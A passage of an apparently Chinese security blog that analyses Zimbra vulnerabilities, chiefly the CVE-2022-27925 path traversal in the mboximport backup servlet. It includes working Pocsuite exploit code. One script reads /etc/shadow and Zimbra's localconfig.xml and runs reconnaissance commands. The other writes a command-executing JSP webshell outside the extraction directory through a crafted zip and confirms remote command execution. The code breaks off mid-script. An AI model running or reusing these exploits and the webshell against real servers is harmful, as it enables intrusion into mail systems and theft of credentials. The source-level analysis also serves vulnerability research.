class="string">&quot;hosts&quot;</span>, <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/etc/hosts&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;cat /etc/hosts&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;shadow&quot;</span>, <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/etc/shadow&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;cat /etc/shadow&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;resolv,conf&quot;</span>, <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/etc/resolv.conf&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;cat /etc/resolv.conf&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;localconfig.xml&quot;</span>, <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/opt/zimbra/conf/localconfig.xml&quot;</span>,<span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;cat /opt/zimbra/conf/localconfig.xml&quot;</span>)&#125;,</span><br><span class="line">                ]</span><br><span class="line">                <span class="comment"># 命令执行信息, 针对各类命令执行、代码执行漏洞</span></span><br><span class="line">                result[<span class="string">&quot;commands&quot;</span>] = [</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;id&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;id&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;whoami&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;whoami&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;arp&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;arp -a&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;ifconfig&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;ifconfig&quot;</span>)&#125;</span><br><span class="line">                ]</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> self.parse_output(result)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_attack</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self._verify()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse_output</span>(<span class="params">self, result</span>):</span><br><span class="line">        output = Output(self)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(result.keys()) != <span class="number">0</span>:</span><br><span class="line">            json_result = &#123;</span><br><span class="line">                <span class="string">&quot;result&quot;</span>: &#123;<span class="string">&quot;json&quot;</span>: json.dumps(result)&#125;</span><br><span class="line">            &#125;</span><br><span class="line">            output.success(json_result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output.fail(<span class="string">&#x27;Internet nothing returned&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">register_poc(PoC)</span><br></pre></td></tr></table></figure><p>POC运行结果如下：</p><p><a href="https://pic.imgdb.cn/item/642bec6e6ea21b9a9e439f60.jpg" title="b4f07362-1c0b-44f2-ab17-b6cc8365da1f" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bec6e6ea21b9a9e439f60.jpg" alt="b4f07362-1c0b-44f2-ab17-b6cc8365da1f"></a></p><h2 id="CVE-2022-27925-Zimbra路径穿越导致的RCE漏洞"><a href="#CVE-2022-27925-Zimbra路径穿越导致的RCE漏洞" class="headerlink" title="CVE-2022-27925 Zimbra路径穿越导致的RCE漏洞"></a>CVE-2022-27925 Zimbra路径穿越导致的RCE漏洞</h2><h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a><strong>漏洞原理</strong></h3><h4 id="调试设置"><a href="#调试设置" class="headerlink" title="调试设置"></a><strong>调试设置</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">su zimbra</span><br><span class="line">zmcontrol stop</span><br><span class="line">su</span><br><span class="line"><span class="built_in">cp</span> /opt/zimbra/libexec/zmmailboxdmgr /opt/zimbra/libexec/zmmailboxdmgr.old</span><br><span class="line"><span class="built_in">cp</span> /opt/zimbra/libexec/zmmailboxdmgr.unrestricted /opt/zimbra/libexec/zmmailboxdmgr</span><br><span class="line">su zimbra</span><br><span class="line">zmlocalconfig -e mailboxd_java_options=<span class="string">&quot;`zmlocalconfig -m nokey mailboxd_java_options` -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005&quot;</span></span><br><span class="line">zmcontrol start</span><br></pre></td></tr></table></figure><p>之后在IDEA导入依赖库即可。</p><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a><strong>漏洞分析</strong></h4><p>漏洞出现在 <code>mboximport</code> 相关的功能中，全局搜索定位至<code>com.zimbra.cs.service.backup.MailboxImportServlet</code>：</p><p><a href="https://pic.imgdb.cn/item/642bec8f6ea21b9a9e449541.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bec8f6ea21b9a9e449541.jpg"></a></p><p>由其命名规则和存在的成员函数来看，<code>MailboxImportServlet</code>应该对应一个<code>HttpServlet</code>对象，但是<code>MailboxImportServlet</code>继承于<code>com.zimbra.cs.extension.ExtensionHttpHandler</code> 而非 <code>HttpServlet</code>，因此需要找到如何通过URL关联到此处。</p><p>Zimbra 自定义了 <code>Servlet</code> 对象的基类 <code>ZimbraServlet</code>：</p><p><a href="https://pic.imgdb.cn/item/642becaf6ea21b9a9e4589d9.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642becaf6ea21b9a9e4589d9.jpg"></a></p><p>查看<code>ZimbraServlet</code>的子类：</p><p><a href="https://pic.imgdb.cn/item/642becbf6ea21b9a9e460504.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642becbf6ea21b9a9e460504.jpg"></a></p><p>定位至<code>com.zimbra.cs.extension.ExtensionDispatcherServlet</code>：</p><p><a href="https://pic.imgdb.cn/item/642beccb6ea21b9a9e465cee.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642beccb6ea21b9a9e465cee.jpg"></a></p><p>在<code>webapps\service\WEB-INF\web.xml</code>中可以找到：</p><p><a href="https://pic.imgdb.cn/item/642becd86ea21b9a9e46c6cd.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642becd86ea21b9a9e46c6cd.jpg"></a></p><p><a href="https://pic.imgdb.cn/item/642bece36ea21b9a9e472097.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bece36ea21b9a9e472097.jpg"></a></p><p>因此<code>com.zimbra.cs.extension.ExtensionDispatcherServlet</code>对应的url规则是&#x2F;service&#x2F;extension&#x2F;*，接着在<code>com.zimbra.cs.extension.ExtensionDispatcherServlet#service</code>中：</p><p><a href="https://pic.imgdb.cn/item/642becf36ea21b9a9e47982d.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642becf36ea21b9a9e47982d.jpg"></a></p><p>可以看到handler是一个<code>ExtensionHttpHandler</code>对象，而前面的 <code>MailboxImportServlet</code> 正好继承于 <code>ExtensionHttpHandler</code>。跟进<code>com.zimbra.cs.extension.ExtensionDispatcherServlet#getHandler(javax.servlet.http.HttpServletRequest)</code>：</p><p><a href="https://pic.imgdb.cn/item/642bed016ea21b9a9e47f7f5.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bed016ea21b9a9e47f7f5.jpg"></a></p><p>将url中的&#x2F;service&#x2F;extension之后的内容赋值给extPath，若extPath的长度不为0，则执行getHandler(extPath)，并将结果赋值给handler。跟进<code>com.zimbra.cs.extension.ExtensionDispatcherServlet#getHandler(java.lang.String)</code>：</p><p><a href="https://pic.imgdb.cn/item/642bed196ea21b9a9e48b633.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bed196ea21b9a9e48b633.jpg"></a></p><p>其中sHandlers的定义及赋值如下所示：</p><p><a href="https://pic.imgdb.cn/item/642bed7c6ea21b9a9e4baa1c.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bed7c6ea21b9a9e4baa1c.jpg"></a></p><p>sHandlers是一个Map类型的对象，在<code>com.zimbra.cs.extension.ExtensionDispatcherServlet#register</code>中对sHandlers的键值对进行了操作，其中key来自handler.getPath()：</p><p><a href="https://pic.imgdb.cn/item/642bed896ea21b9a9e4c0eea.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bed896ea21b9a9e4c0eea.jpg"></a></p><p><code>com.zimbra.cs.extension.ExtensionHttpHandler#getPath</code>中存在<code>this.mExtension</code>，可以看到，其在init方法中进行了定义，其中ext是一个<code>ZimbraExtension</code>类型的对象。定位到<code>ZimbraExtension</code>的子类<code>com.zimbra.cs.backup.BackupExtension</code>：</p><p><a href="https://pic.imgdb.cn/item/642bed956ea21b9a9e4c733b.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bed956ea21b9a9e4c733b.jpg"></a></p><p>可以看到在此处执行了<code>ExtensionDispatcherServlet</code>的register方法，并且传入的handler正好是一个<code>MailboxImportServlet</code>实例。那么进入register函数，首先执行<code>handler.init(ext);</code>，此时，this.mExtension是一个<code>BackupExtension</code>实例。之后执行<code>String name = handler.getPath();</code>，因为handler是一个<code>MailboxImportServlet</code>实例，<code>MailboxImportServlet</code>的getPath()方法如下所示：</p><p><a href="https://pic.imgdb.cn/item/642beda26ea21b9a9e4cde8c.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642beda26ea21b9a9e4cde8c.jpg"></a></p><p><code>com.zimbra.cs.extension.ExtensionHttpHandler</code>的getPath()方法如下所示：</p><p><a href="https://pic.imgdb.cn/item/642bedae6ea21b9a9e4d4175.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bedae6ea21b9a9e4d4175.jpg"></a></p><p>因为this.mExtension是一个<code>BackupExtension</code>实例，而BackupExtension的getName()方法如下所示：</p><p><a href="https://pic.imgdb.cn/item/642bedbe6ea21b9a9e4db71d.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bedbe6ea21b9a9e4db71d.jpg"></a></p><p>因此最后name的值为&#x2F;backup&#x2F;mboximport，因此sHandlers的一个键值对为：&#x2F;backup&#x2F;mboximport &#x3D;&gt; new MailboxImportServlet()。之后经过<code>com.zimbra.cs.extension.ExtensionDispatcherServlet#getHandler(java.lang.String)</code>的执行，就会返回一个MailboxImportServlet实例。接着继续审计<code>com.zimbra.cs.extension.ExtensionDispatcherServlet#service</code>：</p><p><a href="https://pic.imgdb.cn/item/642bedca6ea21b9a9e4e112f.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bedca6ea21b9a9e4e112f.jpg"></a></p><p>根据上面分析，首先得到一个MailboxImportServlet实例handler，之后对请求的方法进行判断，如果是POST方法，则执行该MailboxImportServlet实例的doPost方法。在<code>com.zimbra.cs.service.backup.MailboxImportServlet#doPost</code>中，首先通过 <code>getAuthTokenFromCookie</code> 从 Cookie 中提取 token 认证信息，并检查是否为管理员权限：</p><p><a href="https://pic.imgdb.cn/item/642bedd86ea21b9a9e4e7a64.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bedd86ea21b9a9e4e7a64.jpg"></a></p><p>若authToken为空或不是管理员，则返回401状态码以及no authtoken cookie，也就是如下情况：</p><p><a href="https://pic.imgdb.cn/item/642bede36ea21b9a9e4ecdbd.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bede36ea21b9a9e4ecdbd.jpg"></a></p><p>接着代码继续执行：</p><p><a href="https://pic.imgdb.cn/item/642beded6ea21b9a9e4f1bd8.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642beded6ea21b9a9e4f1bd8.jpg"></a></p><p>获取account-name、account-status以及ow参数。接着判断account-name及ow是否为空，若不为空，进入else：</p><p><a href="https://pic.imgdb.cn/item/642bedfc6ea21b9a9e4f9b58.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bedfc6ea21b9a9e4f9b58.jpg"></a></p><p>若我们不传入switch-onl、no-switch以及append，那么switchOnly、noSwitch以及append的值为默认值false。之后还获取了account，若为空，则直接返回，程序中断。因此我们传入的account-name必须是一个存在的用户。</p><p>接着执行之后的代码，不传入switch-onl参数，此时switchOnly的值为false，进入如下if条件：</p><p><a href="https://pic.imgdb.cn/item/642bee216ea21b9a9e50f61f.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bee216ea21b9a9e50f61f.jpg"></a></p><p>在第152行执行了importFrom()方法，其中in为我们POST传入的值。跟进<code>com.zimbra.cs.service.backup.MailboxImportServlet#importFrom</code>：</p><p><a href="https://pic.imgdb.cn/item/642bee2f6ea21b9a9e519529.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bee2f6ea21b9a9e519529.jpg"></a></p><p>source是一个ZipBackupTarget实例，构造函数如下：</p><p><a href="https://pic.imgdb.cn/item/642bee4f6ea21b9a9e529bc9.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bee4f6ea21b9a9e529bc9.jpg"></a></p><p>注意到<code>this.mTempDir = new File(path);</code>，跟进<code>com.zimbra.cs.account.ZAttrServer#getMailboxMoveTempDir</code>：</p><p><a href="https://pic.imgdb.cn/item/642bee6d6ea21b9a9e5387b3.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bee6d6ea21b9a9e5387b3.jpg"></a></p><p>可以看到path的值默认为<code>/opt/zimbra/backup/tmp/mboxmove</code>。因此mTempDir是一个File实例，代表<code>/opt/zimbra/backup/tmp/mboxmove</code>目录。</p><p>之后跟进<code>com.zimbra.cs.backup.ZipBackupTarget#restore</code>方法：</p><p><a href="https://pic.imgdb.cn/item/642bee786ea21b9a9e53e0f8.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bee786ea21b9a9e53e0f8.jpg"></a></p><p>再次跟进<code>com.zimbra.cs.backup.ZipBackupTarget#getAccountSession(java.lang.String)</code>：</p><p><a href="https://pic.imgdb.cn/item/642bee836ea21b9a9e543869.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bee836ea21b9a9e543869.jpg"></a></p><p>返回一个RestoreAcctSession实例，构造方法如下所示：</p><p><a href="https://pic.imgdb.cn/item/642bee916ea21b9a9e54b6e2.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bee916ea21b9a9e54b6e2.jpg"></a></p><p>执行了<code>this.mTempDir = new File(ZipBackupTarget.this.getTempRoot(), accountId);</code>，跟进<code>com.zimbra.cs.backup.ZipBackupTarget#getTempRoot</code>：</p><p><a href="https://pic.imgdb.cn/item/642bee9e6ea21b9a9e557220.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bee9e6ea21b9a9e557220.jpg"></a></p><p>返回的是<code>this.mTempDir</code>，因此此时的this.mTempDir代表的是<code>/opt/zimbra/backup/tmp/mboxmove/xxxxxxxxx</code>目录，其中xxxxxxxxx为accountId。之后跟进<code>com.zimbra.cs.backup.ZipBackupTarget.RestoreAcctSession#unzipToTempFiles</code>：</p><p><a href="https://pic.imgdb.cn/item/642beea96ea21b9a9e55c60c.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642beea96ea21b9a9e55c60c.jpg"></a></p><p>可以看到此处存在路径穿越漏洞。假设我们将压缩包中文件的名字设为<code>../1.txt</code>，那么file对象指代带的就是<code>/opt/zimbra/backup/tmp/mboxmove/xxxxxxxxx/../1.txt</code>，也就是<code>/opt/zimbra/backup/tmp/mboxmove/1.txt</code>。之后跟进<code>com.zimbra.common.util.FileUtil#copy(java.io.InputStream, boolean, java.io.File)</code>：</p><p><a href="https://pic.imgdb.cn/item/642beeb76ea21b9a9e562ce9.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642beeb76ea21b9a9e562ce9.jpg"></a></p><p>可以看到这里将文件内容写入到对应的文件中。因此利用思路已经很明了了。</p><p>我们需要以POST方法在<code>/service/extension/backup/mboximport?account-name=admin&amp;account-status=1&amp;ow=xxx</code>中传入一个压缩包，其中压缩包中有一个文件名为<code>../../../../mailboxd/webapps/zimbraAdmin/1.jsp</code>的文件，内容为普通的webshell payload即可，这样的话上面提到的file对象指代带的就是<code>/opt/zimbra/mailboxd/webapps/zimbraAdmin/1.jsp</code>，程序会将webshell payload写入到<code>/opt/zimbra/mailboxd/webapps/zimbraAdmin/1.jsp</code>中。</p><h3 id="Pocsuite-POC-1"><a href="#Pocsuite-POC-1" class="headerlink" title="Pocsuite-POC"></a>Pocsuite-POC</h3><p>poc可以获取到管理员邮箱、ldap用户密码、mysql地址账号密码以及zimbra敏感配置文件localconfig.xml等敏感信息。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">from</span> pocsuite3.api <span class="keyword">import</span> (</span><br><span class="line">    minimum_version_required, POCBase, register_poc, requests, logger,</span><br><span class="line">    OptString, OrderedDict,</span><br><span class="line">    random_str, Output,</span><br><span class="line">    get_listener_ip, get_listener_port, REVERSE_PAYLOAD</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PoC</span>(<span class="title class_ inherited__">POCBase</span>):</span><br><span class="line">    vulID = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    name = <span class="string">&#x27;Zimbra路径穿越导致的RCE漏洞&#x27;</span></span><br><span class="line">    author = <span class="string">&#x27;rainb0w&#x27;</span></span><br><span class="line">    is0day = <span class="literal">False</span></span><br><span class="line">    <span class="built_in">type</span> = <span class="string">&#x27;目录穿越&#x27;</span></span><br><span class="line">    <span class="comment"># 严重 高危 中危 低危</span></span><br><span class="line">    level = <span class="string">&#x27;严重&#x27;</span></span><br><span class="line">    CVE = <span class="string">&#x27;CVE-2022-27925&#x27;</span></span><br><span class="line">    CNVD = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    CNNVD = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    ExploitDB = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    Vendor = <span class="string">&#x27;Zimbra&#x27;</span></span><br><span class="line">    appName = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    appVersion = [<span class="string">&#x27;v8.8.15 P30-v9.0.0 P23&#x27;</span>]</span><br><span class="line">    Tags = []</span><br><span class="line">    search_keyword = <span class="string">&#x27;title:&quot;Zimbra 管理&quot;&#x27;</span></span><br><span class="line">    desc = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Zimbra 是一家提供专业的电子邮件软件开发供应商，主要提供ZimbraDesktop邮件管理软件。另外提供一套开源协同办公套件包括WebMail，日历，通信录，Web文档管理和创作。</span></span><br><span class="line"><span class="string">    Zimbra的最大特色在于其采用Ajax技术模仿CS桌面应用软件的风格开发的客户端兼容Firefox，Safari和IE浏览器。</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    details = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    最初，Zimbra将CVE-2022-27925称为经过身份验证的路径遍历攻击，其中管理用户可以将文件写入文件系统上的任何目录。因为它最初被认为是仅限管理员的攻击，NVD给它的CVSS基本评分为7.8。</span></span><br><span class="line"><span class="string">    后来，Volexity注意到利用此漏洞的攻击者找到了绕过管理要求的方法，并于2022年8月10日对此进行了报道。这个新的身份验证旁路获得了一个新的标识符- CVE-2022-37042。</span></span><br><span class="line"><span class="string">    通过结合原始路径遍历漏洞和新的身份验证绕过，攻击者可以通过管理员端口（默认为7071）匿名远程危害Zimbra Collaboration Suite系统。</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    solution = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Zimbra 官方下载最新版本进行修复:https://wiki.zimbra.com/wiki/Zimbra_Releases</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    official_solution = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    https://wiki.zimbra.com/wiki/Zimbra_Releases</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    references = []</span><br><span class="line">    samples = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">build_zip</span>(<span class="params">self, jsp, path</span>):</span><br><span class="line">        zip_buffer = io.BytesIO()</span><br><span class="line">        zf = zipfile.ZipFile(zip_buffer, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">        zf.writestr(path, jsp)</span><br><span class="line">        zf.close()</span><br><span class="line">        <span class="keyword">return</span> zip_buffer.getvalue()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">upload_webshell</span>(<span class="params">self</span>):</span><br><span class="line">        paths = [<span class="string">&#x27;../../../../mailboxd/webapps/zimbraAdmin/&#x27;</span>, <span class="string">&#x27;../../../../jetty_base/webapps/zimbraAdmin/&#x27;</span>, <span class="string">&#x27;../../../../jetty/webapps/zimbraAdmin/&#x27;</span>]</span><br><span class="line">        self.webshellName = random_str(<span class="number">10</span>) + <span class="string">&#x27;.jsp&#x27;</span></span><br><span class="line">        self.webshellPass = <span class="string">&quot;sMuw1P2&quot;</span></span><br><span class="line">        webshell_payload = <span class="string">r&quot;&quot;&quot;&lt;%@ page language=&quot;java&quot; pageEncoding=&quot;UTF-8&quot; %&gt;</span></span><br><span class="line"><span class="string">&lt;%</span></span><br><span class="line"><span class="string">    Runtime rt = Runtime.getRuntime();</span></span><br><span class="line"><span class="string">    String cmd = request.getParameter(&quot;sMuw1P2&quot;);</span></span><br><span class="line"><span class="string">    Process process = rt.exec(cmd);</span></span><br><span class="line"><span class="string">    java.io.InputStream in = process.getInputStream();</span></span><br><span class="line"><span class="string">    java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);</span></span><br><span class="line"><span class="string">    java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);</span></span><br><span class="line"><span class="string">    String s = null;</span></span><br><span class="line"><span class="string">    while ((s = stdInput.readLine()) != null) &#123;</span></span><br><span class="line"><span class="string">        out.println(s);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">%&gt;&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            flag = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> paths:</span><br><span class="line">                endpoints = [<span class="string">&quot;/service/extension/backup/mboximport?account-name=admin&amp;account-status=1&amp;ow=cmd&quot;</span>,</span><br><span class="line">                             <span class="string">&quot;/service/extension/backup/mboximport?account-name=admin&amp;ow=2&amp;no-switch=1&amp;append=1&quot;</span>]</span><br><span class="line">                zippedfile = self.build_zip(webshell_payload, i + self.webshellName)</span><br><span class="line">                headers = &#123;<span class="string">&#x27;content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;</span><br><span class="line">                <span class="keyword">for</span> endpoint <span class="keyword">in</span> endpoints:</span><br><span class="line">                    requests.post(self.url + endpoint, data=zippedfile, verify=<span class="literal">False</span>, headers=headers, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">                    ranStr2echo = random_str(<span class="number">10</span>)</span><br><span class="line">                    <span class="keyword">if</span> ranStr2echo <span class="keyword">in</span> self.execute_command(<span class="string">&#x27;echo &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(ranStr2echo)):</span><br><span class="line">                        flag = <span class="literal">True</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> flag:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span 